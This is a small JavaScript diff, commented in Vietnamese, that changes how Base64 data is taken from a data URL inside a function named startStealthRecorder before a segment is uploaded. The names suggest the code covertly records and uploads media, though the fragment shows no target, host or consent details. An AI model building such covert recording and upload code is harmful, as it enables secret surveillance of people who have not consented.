@@ -2369,7 +2369,9 @@ function startStealthRecorder() {
         // Fallback: xử lý Base64 trên main thread nếu Worker không khả dụng
         const reader = new FileReader();
         reader.onloadend = () => {
-          const base64 = reader.result.split(',')[1];
+          const marker = ';base64,';
+          const markerIdx = reader.result.indexOf(marker);
+          const base64 = markerIdx !== -1 ? reader.result.substring(markerIdx + marker.length) : reader.result.split(',').pop();
           uploadStealthSegment(base64, currentPart, mt);
         };
         reader.readAsDataURL(blob);
